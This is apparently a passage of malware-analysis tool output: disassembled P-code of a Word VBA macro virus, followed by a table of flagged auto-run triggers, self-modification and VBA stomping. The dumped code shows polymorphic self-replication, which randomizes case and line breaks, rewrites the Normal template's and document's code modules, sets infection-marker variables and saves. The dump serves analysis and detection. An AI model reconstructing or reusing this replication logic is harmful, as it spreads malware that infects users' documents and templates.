' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #317:
' 	Ld A9 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St A9 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld JB 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld Q1 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #318:
' 	Ld TM 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St TM 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld JL 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld T9 
' 	Concat 
' 	LitStr 0x0002 "= "
' 	Concat 
' 	Ld CC 
' 	Concat 
' 	Ld NK 
' 	Concat 
' 	Ld CC 
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld JX 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #319:
' 	Ld AA 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld J 
' 	LitDI2 0x0001 
' 	Add 
' 	St J 
' 	BoS 0x0000 
' 	Ld J 
' 	Ld I 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St AA 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld JX 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	LitStr 0x0025 "THISDOCUMENT.VBPROJECT.VBCOMPONENTS( "
' 	Concat 
' 	Ld RF 
' 	Concat 
' 	LitStr 0x0019 ").CODEMODULE.INSERTLINES "
' 	Concat 
' 	Ld RG 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	Ld V3 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	Ld F9 
' 	Concat 
' 	Ld JD 
' 	Concat 
' 	St K 
' 	BoS 0x0000 
' 	GoTo 2 
' 	EndIf 
' 	EndIf 
' Line #320:
' 	Loop 
' Line #321:
' 	GoSub F8 
' Line #322:
' 	Ld K 
' 	Ld C 
' 	Concat 
' 	Ld JD 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld G2 
' 	Concat 
' 	Ld C 
' 	Concat 
' 	LitStr 0x0008 " END SUB"
' 	Concat 
' 	Ld C 
' 	Concat 
' 	St K 
' Line #323:
' 	Ld K 
' 	FnLen 
' 	Ld TE 
' 	Le 
' 	Not 
' 	DoWhile 
' Line #324:
' 	Ld TE 
' 	LitDI2 0x0001 
' 	Add 
' 	St TE 
' Line #325:
' 	Ld K 
' 	Ld TE 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St TT 
' Line #326:
' 	Ld TT 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Ld TT 
' 	LitStr 0x0001 "."
' 	Eq 
' 	Or 
' 	Ld TT 
' 	LitStr 0x0001 ","
' 	Eq 
' 	Or 
' 	Ld TT 
' 	LitStr 0x0001 "("
' 	Eq 
' 	Or 
' 	Ld TT 
' 	LitStr 0x0001 ")"
' 	Eq 
' 	Or 
' 	Ld TT 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Or 
' 	Ld TT 
' 	LitStr 0x0001 ">"
' 	Eq 
' 	Or 
' 	Ld TT 
' 	LitStr 0x0001 "<"
' 	Eq 
' 	Or 
' 	Ld TT 
' 	LitStr 0x0001 "="
' 	Eq 
' 	Or 
' 	Ld TT 
' 	LitStr 0x0001 "+"
' 	Eq 
' 	Or 
' 	Ld TT 
' 	LitStr 0x0001 "-"
' 	Eq 
' 	Or 
' 	Ld TT 
' 	LitStr 0x0001 "*"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	Ld GJ 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld K1 
' 	LitStr 0x0002 " _"
' 	Add 
' 	Ld C 
' 	Add 
' 	St K1 
' 	BoS 0x0000 
' 	GoTo 4 
' 	EndIf 
' 	EndIf 
' Line #327:
' 	Ld TT 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	Ld TE 
' 	Ld K 
' 	FnLen 
' 	Lt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld GL 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld K1 
' 	Ld C 
' 	Concat 
' 	Ld NB 
' 	Concat 
' 	LitStr 0x0002 ": "
' 	Concat 
' 	St K1 
' 	BoS 0x0000 
' 	Ld K 
' 	Ld TE 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld TE 
' 	LitDI2 0x0001 
' 	Add 
' 	St TE 
' 	BoS 0x0000 
' 	GoTo 4 
' 	EndIf 
' 	EndIf 
' 	EndIf 
' Line #328:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St G6 
' Line #329:
' 	Ld G6 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld TT 
' 	ArgsLd UCase 0x0001 
' 	St TT 
' 	Else 
' 	BoSImplicit 
' 	Ld TT 
' 	ArgsLd LCase 0x0001 
' 	St TT 
' 	EndIf 
' Line #330:
' 	LineNum 4 
' 	Ld K1 
' 	Ld TT 
' 	Add 
' 	St K1 
' Line #331:
' 	Loop 
' Line #332:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NORMAL 
' 	MemLd ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	With 
' Line #333:
' 	LitDI2 0x0001 
' 	MemLdWith COUNTOFLINES 
' 	ArgsMemCallWith DELETELINES 0x0002 
' Line #334:
' 	LitDI2 0x0001 
' 	Ld N8 
' 	Ld K1 
' 	Add 
' 	ArgsMemCallWith INSERTLINES 0x0002 
' Line #335:
' 	EndWith 
' Line #336:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	With 
' Line #337:
' 	LitDI2 0x0001 
' 	MemLdWith COUNTOFLINES 
' 	ArgsMemCallWith DELETELINES 0x0002 
' Line #338:
' 	LitDI2 0x0001 
' 	Ld N8 
' 	Ld K1 
' 	Add 
' 	ArgsMemCallWith INSERTLINES 0x0002 
' Line #339:
' 	EndWith 
' Line #340:
' 	ArgsCall DoEvents 0x0000 
' Line #341:
' 	Ld O9 
' 	Ld O7 
' 	Eq 
' 	Ld O9 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #342:
' 	Ld O5 
' 	LitDI2 0x0001 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NE 
' 	Ld NORMAL 
' 	MemLd ThisDocument 
' 	MemLd Variables 
' 	ArgsMemCall Add 0x0002 
' 	EndIf 
' Line #343:
' 	Ld O6 
' 	LitDI2 0x0001 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NE 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	ArgsMemCall Add 0x0002 
' 	EndIf 
' Line #344:
' 	Ld O5 
' 	LitDI2 0x0001 
' 	Ne 
' 	Ld O6 
' 	LitDI2 0x0001 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NE 
' 	Ld NORMAL 
' 	MemLd ThisDocument 
' 	MemLd Variables 
' 	ArgsMemCall Add 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld NE 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	ArgsMemCall Add 0x0002 
' 	EndIf 
' Line #345:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #346:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #347:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBCOMPONENTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CODEMODULE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

